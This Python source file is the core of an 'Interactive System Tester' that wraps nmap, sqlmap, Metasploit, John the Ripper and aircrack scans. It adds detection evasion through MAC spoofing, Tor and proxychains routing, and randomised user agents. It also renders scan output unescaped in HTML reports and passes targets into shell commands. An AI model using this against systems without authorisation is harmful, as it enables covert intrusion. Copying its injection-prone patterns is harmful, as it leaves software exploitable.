#!/usr/bin/env python3
import subprocess
import logging
from datetime import datetime
import os
import sys
import csv
import threading
from queue import Queue
import time
import random
import requests
from jinja2 import Environment, FileSystemLoader
from prompt_toolkit import PromptSession
from prompt_toolkit.completion import WordCompleter
from prompt_toolkit.key_binding import KeyBindings
from prompt_toolkit.formatted_text import HTML
from prompt_toolkit.styles import Style
from tqdm import tqdm
import xml.etree.ElementTree as ET
import json
import ipaddress
import sqlite3

from scanners.nmap_scanner import NmapScanner
from reporting.enhanced_html import EnhancedHTMLReport
from integrations.cve_data import CVEDataProvider
from utils.plugin_loader import load_scanner_plugins

# New imports for logging
from utils.logging_config import initialize_logging, get_logger, log_with_context

# New imports for async functionality
import asyncio
from utils.scan_profiles import ScanProfileManager
from utils.recommendation_engine import get_recommendations_for_results, get_risk_assessment_for_results
from utils.real_time_feedback import create_progress_monitor
from utils.workflow_manager import WorkflowManager, run_workflow_from_profile

# Import ML predictor
from utils.ml_prediction import MLVulnerabilityPredictor

# Add PostExploitationModule-related imports
from utils.post_exploitation import PostExploitationModule

# Initialize logging with enhanced configuration
initialize_logging(
    level=os.environ.get("LOG_LEVEL", "INFO"),
    app_name="interactive-system-tester",
    sentry_dsn=os.environ.get("SENTRY_DSN"),
    json_format=os.environ.get("JSON_LOGS", "").lower() == "true",
    log_to_console=True,
    log_to_file=True
)

# Get logger for this module
logger = get_logger(__name__)

# Log application startup
logger.info("Interactive System Tester starting", 
            extra={"version": "1.0", "platform": sys.platform})

# Setup Jinja2 for HTML reporting
env = Environment(loader=FileSystemLoader("templates"))

class InteractiveSystemTester:
    def __init__(self):
        self.targets = []
        self.discovered_targets = {}  # Store LAN scan results: {IP: {mac, os, version, ports}}
        self.port_range = "1-1024"
        self.profile = "all"
        self.verbose = False
        self.stealth_mode = False
        self.use_tor = False
        self.network_interface = None  # New variable for selected network interface
        self.proxy_pool = []  # List of proxies (e.g., Tor exit nodes)
        self.results = {}
        self.nmap_results = {}  # Store Nmap results (ports, services, vulnerabilities)
        self.cve_details = {}  # Store enriched CVE data from NVD
        self.lock = threading.Lock()
        self.task_queue = Queue()
        self.setup_templates()
        self.setup_prompt()
        self.setup_database()
        self.last_report_files = {}
        self.max_retries = 3
        self.automation_interval = 0  # Default: automation disabled (0 seconds)
        self.automation_thread = None

        # Initialize new components
        self.profile_manager = ScanProfileManager()
        self.progress_monitor = None
        self.workflow_manager = None
        self.recommendations = []
        self.use_workflow_system = True  # Enable workflow system by default
        self.use_realtime_updates = True  # Enable real-time updates by default
        self.selected_profile_id = None
        
        # Initialize ML predictor
        self.use_ml_predictions = True  # Enable ML predictions by default
        try:
            self.ml_predictor = MLVulnerabilityPredictor()
            self.logger.info("ML Vulnerability Predictor initialized successfully")
        except Exception as e:
            self.logger.error(f"Failed to initialize ML Vulnerability Predictor: {str(e)}")
            self.use_ml_predictions = False
            self.ml_predictor = None
        
        self.ml_risk_assessments = {}
        self.ml_predictions = {}

        # Initialize post-exploitation module
        config_file = "post_exploitation_config.json"
        self.post_exploit = PostExploitationModule(config_file=config_file)
        self.authorized_token = None
        self.active_exploit_sessions = {}
        self.logger.info("Post-Exploitation Module initialized")

        # Initialize logging for the instance
        self.logger = get_logger(f"{__name__}.InteractiveSystemTester")
        self.logger.info("Initializing Interactive System Tester")

    def setup_templates(self):
        """Create templates directory and basic HTML template if not exists"""
        os.makedirs("templates", exist_ok=True)
        if not os.path.exists("templates/report.html"):
            with open("templates/report.html", "w") as f:
                f.write("""
                <!DOCTYPE html>
                <html>
                <head>
                    <title>Interactive System Test Report - {{ timestamp }}</title>
                    <style>
                        body { font-family: Arial, sans-serif; }
                        h1 { color: #333; }
                        h2, h3 { color: #555; }
                        pre { background-color: #f4f4f4; padding: 10px; border-radius: 5px; }
                        .severity-high { color: red; font-weight: bold; }
                        .severity-medium { color: orange; }
                        .severity-low { color: green; }
                        table { border-collapse: collapse; width: 100%; margin-bottom: 20px; }
                        th, td { border: 1px solid #ddd; padding: 8px; text-align: left; }
                        th { background-color: #f2f2f2; }
                    </style>
                    <script>
                        function filterTable() {
                            var input = document.getElementById("ipFilter").value.toLowerCase();
                            var tables = document.getElementsByTagName("table");
                            for (var i = 0; i < tables.length; i++) {
                                var tr = tables[i].getElementsByTagName("tr");
                                for (var j = 1; j < tr.length; j++) {
                                    var td = tr[j].getElementsByTagName("td")[0];
                                    if (td) {
                                        var txtValue = td.textContent || td.innerText;
                                        if (txtValue.toLowerCase().indexOf(input) > -1) {
                                            tr[j].style.display = "";
                                        } else {
                                            tr[j].style.display = "none";
                                        }
                                    }
                                }
                            }
                        }
                    </script>
                </head>
                <body>
                    <h1>Interactive System Test Report - {{ timestamp }}</h1>
                    <input type="text" id="ipFilter" onkeyup="filterTable()" placeholder="Filter by IP...">
                    {% if targets %}
                        <h2>Discovered Targets</h2>
                        <table>
                            <tr><th>IP Address</th><th>MAC Address</th><th>Platform</th><th>Version</th><th>Open Ports</th><th>Scan Timestamp</th></tr>
                            {% for target in targets %}
                                <tr>
                                    <td>{{ target[1] }}</td>
                                    <td>{{ target[2] or 'N/A' }}</td>
                                    <td>{{ target[3] or 'Unknown' }}</td>
                                    <td>{{ target[4] or 'N/A' }}</td>
                                    <td>{{ ', '.join([f"{p['port']}/{p['service']}" for p in target[6]]) }}</td>
                                    <td>{{ target[5] }}</td>
                                </tr>
                            {% endfor %}
                        </table>
                    {% endif %}
                    {% if test_results %}
                        <h2>Test Results</h2>
                        <table>
                            <tr><th>IP Address</th><th>Test Name</th><th>Result</th><th>Timestamp</th></tr>
                            {% for result in test_results %}
                                <tr>
                                    <td>{{ result[0] }}</td>
                                    <td>{{ result[1] }}</td>
                                    <td>{{ result[2][:50] + '...' if result[2]|length > 50 else result[2] }}</td>
                                    <td>{{ result[3] }}</td>
                                </tr>
                            {% endfor %}
                        </table>
                    {% endif %}
                    {% if vulnerabilities %}
                        <h2>Vulnerabilities</h2>
                        <table>
                            <tr><th>IP Address</th><th>Port</th><th>Script</th><th>Output</th><th>CVE</th><th>Score</th><th>Description</th><th>Timestamp</th></tr>
                            {% for vuln in vulnerabilities %}
                                <tr>
                                    <td>{{ vuln[0] }}</td>
                                    <td>{{ vuln[1] }}</td>
                                    <td>{{ vuln[2] }}</td>
                                    <td>{{ vuln[3][:30] + '...' if vuln[3]|length > 30 else vuln[3] }}</td>
                                    <td>{{ vuln[4] or 'N/A' }}</td>
                                    <td class="{% if vuln[5] >= 7 %}severity-high{% elif vuln[5] >= 4 %}severity-medium{% else %}severity-low{% endif %}">{{ vuln[5] }}</td>
                                    <td>{{ vuln[6][:30] + '...' if vuln[6]|length > 30 else vuln[6] }}</td>
                                    <td>{{ vuln[7] }}</td>
                                </tr>
                            {% endfor %}
                        </table>
                    {% endif %}
                    {% for target, result in results.items() %}
                        <h2>Target: {{ target }}</h2>
                        {% for test, output in result.items() %}
                            <h3>{{ test }}</h3>
                            <pre>{{ output|safe }}</pre>
                        {% endfor %}
                    {% endfor %}
                </body>
                </html>
                """)

        self.logger.debug("Setting up HTML templates")

    def setup_prompt(self):
        """Setup interactive prompt with autocompletion and keybindings"""
        self.style = Style.from_dict({
            'prompt': '#00ff00 bold',
            'error': '#ff0000',
            'info': '#00aa00',
            'warning': '#ffaa00',
        })
        self.bindings = KeyBindings()
        self.bindings.add('c-c')(lambda event: sys.exit(0))
        self.completer = WordCompleter([
            'all', 'network', 'vulnerability', 'exploitation', 'anonymity', 'auditing', 'wireless',
            'yes', 'no', 'verbose', 'quiet', '127.0.0.1', 'lan',
            'configure', 'targets', 'run', 'export', 'exit', 'query_db', 'enhanced_report', 'configure_automation',
            'text', 'html', 'enhanced_html', 'csv'
        ], ignore_case=True)
        self.session = PromptSession(
            style=self.style,
            completer=self.completer,
            key_bindings=self.bindings,
            multiline=False,
            prompt_message=HTML('<prompt>SystemTester> </prompt>')
        )

        # Add new commands to completer
        self.completer = WordCompleter([
            'all', 'network', 'vulnerability', 'exploitation', 'anonymity', 'auditing', 'wireless',
            'yes', 'no', 'verbose', 'quiet', '127.0.0.1', 'lan',
            'configure', 'targets', 'run', 'export', 'exit', 'query_db', 'enhanced_report', 
            'configure_automation', 'create_profile', 'manage_profiles', 'show_recommendations',
            'ml_predict', 'ml_risk_assessment', 'train_ml_model',
            'text', 'html', 'enhanced_html', 'csv'
        ], ignore_case=True)

        self.logger.debug("Setting up interactive prompt")

    def setup_database(self):
        """Initialize SQLite database and create tables"""
        self.db_file = "system_tester.db"
        self.conn = sqlite3.connect(self.db_file)
        self.cursor = self.conn.cursor()

        self.cursor.execute('''
            CREATE TABLE IF NOT EXISTS targets (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                ip TEXT NOT NULL,
                mac TEXT,
                os TEXT,
                version TEXT,
                scan_timestamp TEXT
            )
        ''')
        self.cursor.execute('''
            CREATE TABLE IF NOT EXISTS ports (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                target_id INTEGER,
                port INTEGER,
                service TEXT,
                version TEXT,
                FOREIGN KEY (target_id) REFERENCES targets(id)
            )
        ''')
        self.cursor.execute('''
            CREATE TABLE IF NOT EXISTS test_results (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                target_id INTEGER,
                test_name TEXT,
                result TEXT,
                timestamp TEXT,
                FOREIGN KEY (target_id) REFERENCES targets(id)
            )
        ''')
        self.cursor.execute('''
            CREATE TABLE IF NOT EXISTS vulnerabilities (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                target_id INTEGER,
                port INTEGER,
                script TEXT,
                output TEXT,
                cve TEXT,
                score REAL,
                description TEXT,
                timestamp TEXT,
                FOREIGN KEY (target_id) REFERENCES targets(id)
            )
        ''')
        
        # Add new table for ML predictions
        self.cursor.execute('''
            CREATE TABLE IF NOT EXISTS ml_predictions (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                target_id INTEGER,
                service_name TEXT,
                service_port INTEGER,
                service_version TEXT,
                probability REAL,
                prediction TEXT,
                potential_cves TEXT,
                timestamp TEXT,
                FOREIGN KEY (target_id) REFERENCES targets(id)
            )
        ''')
        
        # Add new table for ML risk assessments
        self.cursor.execute('''
            CREATE TABLE IF NOT EXISTS ml_risk_assessments (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                target_id INTEGER,
                risk_score REAL,
                risk_level TEXT,
                recommendations TEXT,
                timestamp TEXT,
                FOREIGN KEY (target_id) REFERENCES targets(id)
            )
        ''')
        
        self.conn.commit()
        self.logger.info(f"Setting up SQLite database: {self.db_file}")
        self.logger.info("SQLite database initialized successfully")

    def store_target(self, ip, mac, os, version, ports):
        """Store discovered target in the database"""
        timestamp = datetime.now().isoformat()
        self.cursor.execute('''
            INSERT INTO targets (ip, mac, os, version, scan_timestamp)
            VALUES (?, ?, ?, ?, ?)
        ''', (ip, mac, os, version, timestamp))
        target_id = self.cursor.lastrowid

        for port_info in ports:
            self.cursor.execute('''
                INSERT INTO ports (target_id, port, service, version)
                VALUES (?, ?, ?, ?)
            ''', (target_id, port_info['port'], port_info['service'], port_info['version']))

        self.conn.commit()
        self.logger.debug(f"Storing target in database: {ip}")
        self.logger.debug(f"Target stored with ID {target_id}")
        return target_id

    def store_test_result(self, target_id, test_name, result):
        """Store test result in the database"""
        timestamp = datetime.now().isoformat()
        self.cursor.execute('''
            INSERT INTO test_results (target_id, test_name, result, timestamp)
            VALUES (?, ?, ?, ?)
        ''', (target_id, test_name, result, timestamp))
        self.conn.commit()
        self.logger.debug(f"Storing test result in database: {test_name} for target ID {target_id}")

    def store_vulnerability(self, target_id, port, script, output, cve, score, description):
        """Store vulnerability in the database"""
        timestamp = datetime.now().isoformat()
        self.cursor.execute('''
            INSERT INTO vulnerabilities (target_id, port, script, output, cve, score, description, timestamp)
            VALUES (?, ?, ?, ?, ?, ?, ?, ?)
        ''', (target_id, port, script, output, cve, score, description, timestamp))
        self.conn.commit()
        self.logger.debug(f"Storing vulnerability in database: {script} on port {port} for target ID {target_id}")

    def store_ml_prediction(self, target_id, service_name, service_port, service_version, probability, prediction, potential_cves):
        """Store ML prediction in the database"""
        timestamp = datetime.now().isoformat()
        self.cursor.execute('''
            INSERT INTO ml_predictions (target_id, service_name, service_port, service_version, probability, prediction, potential_cves, timestamp)
            VALUES (?, ?, ?, ?, ?, ?, ?, ?)
        ''', (target_id, service_name, service_port, service_version, probability, prediction, json.dumps(potential_cves), timestamp))
        self.conn.commit()
        self.logger.debug(f"Storing ML prediction in database for service {service_name}:{service_port} on target ID {target_id}")

    def store_ml_risk_assessment(self, target_id, risk_score, risk_level, recommendations):
        """Store ML risk assessment in the database"""
        timestamp = datetime.now().isoformat()
        self.cursor.execute('''
            INSERT INTO ml_risk_assessments (target_id, risk_score, risk_level, recommendations, timestamp)
            VALUES (?, ?, ?, ?, ?)
        ''', (target_id, risk_score, risk_level, json.dumps(recommendations), timestamp))
        self.conn.commit()
        self.logger.debug(f"Storing ML risk assessment in database for target ID {target_id}")

    def simulate_scan_data(self, num_targets=3):
        """Simulate scan data for automation"""
        for _ in range(num_targets):
            ip = f"192.168.1.{random.randint(1, 254)}"
            mac = ":".join([f"{random.randint(0x00, 0xff):02x}" for _ in range(6)]) if random.choice([True, False]) else None
            os = random.choice(["Linux", "Windows", "Unknown"])
            version = f"{random.randint(1, 10)}.{random.randint(0, 99)}" if os != "Unknown" else None
            ports = [
                {"port": random.randint(1, 65535), "service": random.choice(["ssh", "http", "https", "smb"]), "version": f"{random.randint(1, 10)}"}
                for _ in range(random.randint(1, 5))
            ]
            self.discovered_targets[ip] = {
                'mac': mac,
                'os': os,
                'version': version,
                'ports': ports
            }
            target_id = self.store_target(ip, mac, os, version, ports)

            # Simulate test results
            test_names = ["Nmap Scan", "Nikto Scan", "Metasploit Scan"]
            for test_name in test_names:
                result = f"[SUCCESS] {test_name}\nCompleted {test_name} on {ip} at {datetime.now().isoformat()}\n"
                self.store_test_result(target_id, test_name, result)

            # Simulate vulnerabilities
            if random.choice([True, False]):
                vuln_port = random.choice(ports)["port"]
                vuln_script = "vuln-check"
                vuln_output = f"Vulnerability detected on port {vuln_port}"
                cve = f"CVE-{random.randint(2010, 2025)}-{random.randint(1000, 9999)}" if random.choice([True, False]) else None
                score = random.uniform(0, 10)
                description = f"Description for {cve or 'unknown vulnerability'}" if cve else None
                self.store_vulnerability(target_id, vuln_port, vuln_script, vuln_output, cve, score, description)

        self.logger.info(f"Simulated data for {num_targets} targets")
        print(f"\033[92m[+] Simulated data for {num_targets} targets\033[0m")

    def automate_data_collection(self):
        """Automate periodic data collection"""
        while self.automation_interval > 0:
            print(f"\033[94m[*] Starting automated data collection at {datetime.now().isoformat()}...\033[0m")
            self.simulate_scan_data(random.randint(1, 5))  # Simulate 1-5 targets
            self.save_report(formats=['html'])  # Generate HTML report after each automation cycle
            time.sleep(self.automation_interval)

    def configure_automation(self):
        """Configure automation interval and start background thread"""
        print("\n\033[94m=== Configure Automation ===\033[0m")
        interval_input = self.session.prompt(
            HTML('<prompt>Enter automation interval in seconds (default: 3600, 0 to disable): </prompt>')
        )
        try:
            self.automation_interval = int(interval_input) if interval_input else 3600
            if self.automation_interval == 0:
                print("\033[93m[-] Automation disabled.\033[0m")
                return
            print(f"\033[92m[+] Automation configured with interval {self.automation_interval} seconds\033[0m")
            if self.automation_thread is None or not self.automation_thread.is_alive():
                self.automation_thread = threading.Thread(target=self.automate_data_collection, daemon=True)
                self.automation_thread.start()
        except ValueError:
            print("\033[91m[!] Invalid interval. Using default 3600 seconds.\033[0m")
            self.automation_interval = 3600
            if self.automation_thread is None or not self.automation_thread.is_alive():
                self.automation_thread = threading.Thread(target=self.automate_data_collection, daemon=True)
                self.automation_thread.start()

    def query_db(self):
        """Interactively query the database with enhanced filtering"""
        print("\n\033[94m=== Database Query ===\033[0m")
        query_type = self.session.prompt(
            HTML('<prompt>Choose query type (targets/results/vulnerabilities): </prompt>'),
            completer=WordCompleter(['targets', 'results', 'vulnerabilities'], ignore_case=True)
        ).lower()

        if query_type == "targets":
            filter_ip = self.session.prompt(HTML('<prompt>Enter IP to filter (or press Enter for all): </prompt>'))
            if filter_ip:
                self.cursor.execute('SELECT * FROM targets WHERE ip = ?', (filter_ip,))
            else:
                self.cursor.execute("SELECT * FROM targets")
            rows = self.cursor.fetchall()
            print("\nIP Address\tMAC Address\tPlatform\tVersion\t\tScan Timestamp")
            print("-" * 80)
            for row in rows:
                print(f"{row[1]}\t\t{row[2] or 'N/A'}\t\t{row[3] or 'Unknown'}\t\t{row[4] or 'N/A'}\t\t{row[5]}")
            print("-" * 80)

        elif query_type == "results":
            ip = self.session.prompt(HTML('<prompt>Enter IP to filter results (or press Enter for all): </prompt>'))
            if ip:
                self.cursor.execute('''
                    SELECT t.ip, tr.test_name, tr.result, tr.timestamp
                    FROM test_results tr
                    JOIN targets t ON tr.target_id = t.id
                    WHERE t.ip = ?
                ''', (ip,))
            else:
                self.cursor.execute('''
                    SELECT t.ip, tr.test_name, tr.result, tr.timestamp
                    FROM test_results tr
                    JOIN targets t ON tr.target_id = t.id
                ''')
            rows = self.cursor.fetchall()
            print("\nIP Address\tTest Name\tResult\tTimestamp")
            print("-" * 80)
            for row in rows:
                print(f"{row[0]}\t\t{row[1]}\t\t{row[2][:50] + '...' if len(row[2]) > 50 else row[2]}\t{row[3]}")
            print("-" * 80)

        elif query_type == "vulnerabilities":
            ip = self.session.prompt(HTML('<prompt>Enter IP to filter vulnerabilities (or press Enter for all): </prompt>'))
            min_score = self.session.prompt(HTML('<prompt>Enter minimum CVSS score to filter (or press Enter for all): </prompt>')) or 0
            try:
                min_score = float(min_score)
                if ip:
                    self.cursor.execute('''
                        SELECT t.ip, v.port, v.script, v.output, v.cve, v.score, v.description, v.timestamp
                        FROM vulnerabilities v
                        JOIN targets t ON v.target_id = t.id
                        WHERE t.ip = ? AND v.score >= ?
                    ''', (ip, min_score))
                else:
                    self.cursor.execute('''
                        SELECT t.ip, v.port, v.script, v.output, v.cve, v.score, v.description, v.timestamp
                        FROM vulnerabilities v
                        JOIN targets t ON v.target_id = t.id
                        WHERE v.score >= ?
                    ''', (min_score,))
                rows = self.cursor.fetchall()
                print("\nIP Address\tPort\tScript\tOutput\tCVE\tScore\tDescription\tTimestamp")
                print("-" * 100)
                for row in rows:
                    print(f"{row[0]}\t\t{row[1]}\t{row[2]}\t{row[3][:30] + '...' if len(row[3]) > 30 else row[3]}\t{row[4] or 'N/A'}\t{row[5]}\t{row[6][:30] + '...' if len(row[6]) > 30 else row[6]}\t{row[7]}")
                print("-" * 100)
            except ValueError:
                print("\033[91m[!] Invalid score value. Please enter a number.\033[0m")

    def check_tool(self, tool):
        """Check if a tool is installed"""
        cmd = f"which {tool}"
        result = subprocess.run(cmd, shell=True, capture_output=True, text=True, env={"PATH": "/data/data/com.termux/files/usr/bin:/system/bin"})
        if result.returncode != 0:
            logging.error(f"{tool} not found")
            if self.verbose:
                print(f"\033[91m[!] Error: {tool} is not installed. Install with 'pkg install {tool}'.\033[0m")
            return False
        return True

    def setup_anonymity(self):
        """Setup anonymity using Tor, AnonSurf, or external proxies"""
        if not self.use_tor:
            return

        if self.check_tool("anonsurf"):
            print("\033[94m[*] Setting up AnonSurf for anonymity...\033[0m")
            subprocess.run("anonsurf start", shell=True, capture_output=True, text=True)
            time.sleep(5)
            result = subprocess.run("anonsurf myip", shell=True, capture_output=True, text=True)
            if self.verbose:
                print(f"\033[92m[+] AnonSurf IP: {result.stdout}\033[0m")
        elif self.check_tool("torsocks"):
            print("\033[94m[*] Using torsocks for anonymity...\033[0m")
            self.proxy_pool = self.fetch_tor_exit_nodes()
        else:
            print("\033[93m[-] Neither AnonSurf nor torsocks found. Anonymity features disabled.\033[0m")
            self.use_tor = False

    def fetch_tor_exit_nodes(self):
        """Fetch a list of Tor exit nodes as proxies"""
        try:
            response = requests.get("https://onionoo.torproject.org/details?type=relay&running=true", timeout=10)
            data = response.json()
            proxies = [f"socks5://{relay['a'][0]}:{relay['or_addresses'][0].split(':')[1]}" for relay in data['relays'] if 'exit' in relay['flags']]
            return proxies[:5]
        except Exception as e:
            logging.error(f"Failed to fetch Tor exit nodes: {str(e)}")
            return []

    def spoof_mac(self):
        """Spoof MAC address for stealth using the selected network interface"""
        if not self.stealth_mode:
            return

        if not self.network_interface:
            print("\033[93m[-] No network interface selected. Please configure one using 'configure'.\033[0m")
            return

        try:
            mac = ":".join([f"{random.randint(0x00, 0xff):02x}" for _ in range(6)])
            subprocess.run(f"ifconfig {self.network_interface} down", shell=True, check=True)
            subprocess.run(f"macchanger -m {mac} {self.network_interface}", shell=True, check=True)
            subprocess.run(f"ifconfig {self.network_interface} up", shell=True, check=True)
            print(f"\033[92m[+] MAC address spoofed to {mac} on {self.network_interface}\033[0m")
        except subprocess.CalledProcessError as e:
            logging.error(f"Failed to spoof MAC address: {str(e)}")
            print(f"\033[91m[!] Failed to spoof MAC address on {self.network_interface}: {str(e)}\033[0m")

    def run_command(self, cmd, description, target=None, output_file=None, retries=0):
        """Run a shell command with retry logic and stealth enhancements"""
        target = target or self.targets[0]
        logging.info(f"Running {description} on {target}")
        if self.verbose:
            print(f"\033[92m[*] {description} on {target}...\033[0m")

        proxy = random.choice(self.proxy_pool) if self.proxy_pool and self.use_tor else None
        if proxy:
            cmd = f"proxychains -q {cmd}"

        if "nikto" in cmd or "sqlmap" in cmd:
            user_agent = f"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/{random.randint(500, 600)}.{random.randint(0, 99)} (KHTML, like Gecko) Chrome/{random.randint(70, 90)}.0.{random.randint(0, 9999)}.0 Safari/{random.randint(500, 600)}.{random.randint(0, 99)}"
            if "nikto" in cmd:
                cmd += f" -useragent \"{user_agent}\""
            if "sqlmap" in cmd:
                cmd += f" --user-agent=\"{user_agent}\""

        for attempt in range(retries + 1):
            try:
                if output_file:
                    cmd += f" -oX {output_file}"
                result = subprocess.run(cmd, shell=True, capture_output=True, text=True, timeout=600 + (attempt * 300), check=False)
                if result.returncode != 0:
                    error_msg = f"Error: {result.stderr}"
                    logging.error(f"{description} failed (attempt {attempt + 1}): {error_msg}")
                    with self.lock:
                        self.results[target][description] = f"[ERROR] {description} (Attempt {attempt + 1})\n{error_msg}\n"
                    if self.verbose:
                        print(f"\033[91m[!] Failed: {description} (Attempt {attempt + 1})\033[0m")
                    if attempt < retries:
                        time.sleep(random.uniform(2, 5))
                        continue
                    return False
                output = result.stdout
                with self.lock:
                    self.results[target][description] = f"[SUCCESS] {description}\n{output}\n"
                if self.verbose:
                    print(f"\033[92m[+] Completed: {description}\033[0m")

                # Store the result in the database
                self.cursor.execute("SELECT id FROM targets WHERE ip = ?", (target,))
                target_id = self.cursor.fetchone()
                if target_id:
                    self.store_test_result(target_id[0], description, f"[SUCCESS] {description}\n{output}\n")

                return True
            except subprocess.TimeoutExpired:
                error_msg = "Command timed out"
                logging.error(f"{description} timed out (attempt {attempt + 1}): {error_msg}")
                with self.lock:
                    self.results[target][description] = f"[ERROR] {description} (Attempt {attempt + 1})\n{error_msg}\n"
                if self.verbose:
                    print(f"\033[91m[!] Failed: {description} (Timeout, Attempt {attempt + 1})\033[0m")
                if attempt < retries:
                    time.sleep(random.uniform(2, 5))
                    continue
                return False
            except Exception as e:
                error_msg = f"Unexpected error: {str(e)}"
                logging.error(f"{description} failed (attempt {attempt + 1}): {error_msg}")
                with self.lock:
                    self.results[target][description] = f"[ERROR] {description} (Attempt {attempt + 1})\n{error_msg}\n"
                if self.verbose:
                    print(f"\033[91m[!] Failed: {description} (Attempt {attempt + 1})\033[0m")
                if attempt < retries:
                    time.sleep(random.uniform(2, 5))
                    continue
                return False
        return False

    def worker(self):
        """Worker thread to process tasks from queue with error handling"""
        while True:
            try:
                target, cmd, description = self.task_queue.get_nowait()
                self.run_command(cmd, description, target, retries=self.max_retries - 1)
                self.task_queue.task_done()
            except Queue.Empty:
                break
            except Exception as e:
                logging.error(f"Worker thread error: {str(e)}")
                self.task_queue.task_done()

    def run_parallel_tasks(self, tasks):
        """Run tasks in parallel with a progress bar"""
        total_tasks = len(tasks)
        print(f"\n\033[94m[*] Starting {total_tasks} tasks...\033[0m")
        with tqdm(total=total_tasks, desc="Progress", bar_format="{l_bar}{bar}| {n_fmt}/{total_fmt} [{elapsed}]") as pbar:
            threads = []
            for _ in range(min(10, total_tasks)):
                t = threading.Thread(target=self.worker)
                t.start()
                threads.append(t)
            for task in tasks:
                self.task_queue.put(task)
            self.task_queue.join()
            for t in threads:
                t.join()
            pbar.update(total_tasks)

    def run_scanner_plugins(self, target):
        """Run all scanner plugins on a target"""
        # Configure scanner options
        options = {
            'port_range': self.port_range,
            'stealth_mode': self.stealth_mode,
            'use_tor': self.use_tor,
            'verbose': self.verbose,
            'network_interface': self.network_interface
        }
        
        # Import all scanner plugins
        from scanners.nmap_scanner import NmapScanner
        from scanners.masscan_scanner import MasscanScanner
        from scanners.netcat_scanner import NetcatScanner
        from scanners.nikto_scanner import NiktoScanner
        from scanners.sqlmap_scanner import SQLMapScanner
        from scanners.metasploit_scanner import MetasploitScanner
        from scanners.lynis_scanner import LynisScanner
        from scanners.chkrootkit_scanner import ChkrootkitScanner
        from scanners.john_scanner import JohnScanner
        from scanners.anonsurf_scanner import AnonSurfScanner
        from scanners.aircrack_scanner import AircrackScanner
        
        scanners = []
        
        # Add scanners based on profile
        if self.profile in ["all", "network"]:
            scanners.append(NmapScanner(options))
            scanners.append(MasscanScanner(options))
            scanners.append(NetcatScanner(options))
        
        if self.profile in ["all", "vulnerability"]:
            scanners.append(NiktoScanner(options))
            scanners.append(SQLMapScanner(options))
            
            # For Metasploit, we need port info from a previous scan
            if target in self.nmap_results and 'ports' in self.nmap_results[target]:
                metasploit_options = options.copy()
                metasploit_options['port_info'] = self.nmap_results[target]['ports']
                scanners.append(MetasploitScanner(metasploit_options))
            else:
                scanners.append(MetasploitScanner(options))
        
        if self.profile in ["all", "exploitation"]:
            # John needs a hash file
            if hasattr(self, 'hash_file') and self.hash_file:
                john_options = options.copy()
                john_options['hash_file'] = self.hash_file
                if hasattr(self, 'wordlist') and self.wordlist:
                    john_options['wordlist'] = self.wordlist
                scanners.append(JohnScanner(john_options))
        
        if self.profile in ["all", "anonymity"]:
            scanners.append(AnonSurfScanner(options))
            
        if self.profile in ["all", "auditing"]:
            # Only run local auditing tools on localhost
            if target in ["127.0.0.1", "localhost", "::1"]:
                scanners.append(LynisScanner(options))
                scanners.append(ChkrootkitScanner(options))
                
        if self.profile in ["all", "wireless"]:
            # Only run wireless tools when specifically requested
            # since they need special handling
            aircrack_options = options.copy()
            aircrack_options['scan_duration'] = 30  # 30 seconds scan by default
            scanners.append(AircrackScanner(aircrack_options))
        
        # Run each scanner
        for scanner in scanners:
            try:
                scanner_name = scanner.__class__.__name__
                logging.info(f"Running {scanner_name} on {target}")
                
                if self.verbose:
                    print(f"\033[94m[*] Running {scanner_name} on {target}...\033[0m")
                    
                results = scanner.scan(target)
                
                # Store results in the database and results dict
                self.results[target][scanner_name] = results
                
                # Process vulnerabilities
                if 'vulnerabilities' in results and results['vulnerabilities']:
                    for vuln in results['vulnerabilities']:
                        # Get target ID from database
                        self.cursor.execute("SELECT id FROM targets WHERE ip = ?", (target,))
                        target_id = self.cursor.fetchone()
                        
                        if target_id:
                            # Fetch CVE details if available
                            cve_details = {'score': 0, 'description': ''}
                            if vuln.get('cve'):
                                cve_details = self.fetch_cve_details(vuln['cve'])
                                
                            # Store vulnerability in database
                            self.store_vulnerability(
                                target_id[0],
                                vuln.get('port', 0),
                                vuln.get('script', scanner_name),
                                vuln.get('output', 'No output'),
                                vuln.get('cve'),
                                cve_details.get('score', 0),
                                cve_details.get('description', '')
                            )
                
                # Store test result in the database
                self.cursor.execute("SELECT id FROM targets WHERE ip = ?", (target,))
                target_id = self.cursor.fetchone()
                if target_id:
                    # Create a summary result message
                    result_summary = f"[SUCCESS] {scanner_name}\n"
                    
                    # Add details based on scanner type
                    if scanner_name == 'NmapScanner' and 'ports' in results:
                        result_summary += f"Found {len(results['ports'])} open ports\n"
                    elif scanner_name == 'NiktoScanner' and 'vulnerabilities' in results:
                        result_summary += f"Found {len(results['vulnerabilities'])} web vulnerabilities\n"
                    elif scanner_name == 'LynisScanner':
                        result_summary += f"Found {len(results.get('warnings', []))} warnings and {len(results.get('suggestions', []))} suggestions\n"
                    elif scanner_name == 'ChkrootkitScanner':
                        result_summary += f"Found {len(results.get('infected', []))} infections and {len(results.get('suspicious', []))} suspicious items\n"
                    elif scanner_name == 'JohnScanner':
                        result_summary += f"Cracked {len(results.get('cracked_passwords', []))} passwords\n"
                    elif scanner_name == 'AnonSurfScanner':
                        result_summary += f"Anonymity status: {results.get('anonymity_status', 'Unknown')}\n"
                    elif scanner_name == 'AircrackScanner':
                        result_summary += f"Found {len(results.get('networks', []))} wireless networks and {len(results.get('vulnerabilities', []))} vulnerabilities\n"
                    
                    # Add raw output excerpt (first 500 chars)
                    if 'raw_output' in results and results['raw_output']:
                        excerpt = results['raw_output'][:500] + "..." if len(results['raw_output']) > 500 else results['raw_output']
                        result_summary += f"\nOutput excerpt:\n{excerpt}\n"
                    
                    # Store in database
                    self.store_test_result(target_id[0], scanner_name, result_summary)
                            
                if self.verbose:
                    print(f"\033[92m[+] Completed {scanner_name} on {target}\033[0m")
                    
            except Exception as e:
                logging.error(f"Error running {scanner.__class__.__name__}: {str(e)}")
                if self.verbose:
                    print(f"\033[91m[!] Error in {scanner.__class__.__name__}: {str(e)}\033[0m")

    def fetch_cve_details(self, cve_id):
        """Fetch enhanced CVE details using the CVE data provider"""
        if not hasattr(self, 'cve_provider'):
            self.cve_provider = CVEDataProvider()
            
        cve_data = self.cve_provider.get_cve_details(cve_id)
